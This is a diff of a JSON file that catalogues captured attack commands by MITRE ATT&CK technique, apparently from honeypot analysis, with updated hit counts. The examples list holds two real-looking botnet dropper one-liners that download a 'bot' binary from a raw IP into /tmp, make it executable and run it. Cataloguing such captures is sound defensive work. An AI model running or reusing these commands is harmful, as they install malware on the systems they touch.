@@ -1,5 +1,4 @@
 {
-  "schema_version": "1.0",
   "techniques": [
     {
       "id": "T1027",
@@ -25,8 +24,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 7200,
-      "distinct_ips": 437,
+      "count": 7224,
+      "distinct_ips": 438,
       "examples": [
         "m=$(uname -m 2>/dev/null); case $m in arm*) m=arm;; aarch64*) m=aarch64;; mips*el*) m=mipsel;; mips*) m=mips;; i*86*|x86*) m=x86_64;; *) m=arm;; esac; (wget -q http://176.65.134.121:7376/bot.$m -O /tmp/.z 2>/dev/null || wget -q http://176.65.134.121:7376/bot.$m -O /tmp/.z 2>/dev/null) && chmod +x /tmp/.z && (/tmp/.z 176.65.134.121 176.65.134.121 >/dev/null 2>&1 &) >/dev/null 2>&1 &",
         "m=$(uname -m 2>/dev/null); case $m in arm*) m=arm;; aarch64*) m=aarch64;; mips*el*) m=mipsel;; mips*) m=mips;; i*86*|x86*) m=x86_64;; *) m=arm;; esac; (wget -q http://176.65.134.121:6987PROXYONUPDATE:7438/bot.$m -O /tmp/.z 2>/dev/null || wget -q http://176.65.134.121:6987PROXYONUPDATE:7438/bot.$m -O /tmp/.z 2>/dev/null) && chmod +x /tmp/.z && (/tmp/.z 176.65.134.121 176.65.134.121:6987PROXYONUPDATE >/dev/null 2>&1 &) >/dev/null 2>&1 &",
@@ -184,6 +183,6 @@
       ]
     }
   ],
-  "total_commands": 339258,
-  "matched_commands": 132337
+  "total_commands": 339416,
+  "matched_commands": 132361
 }
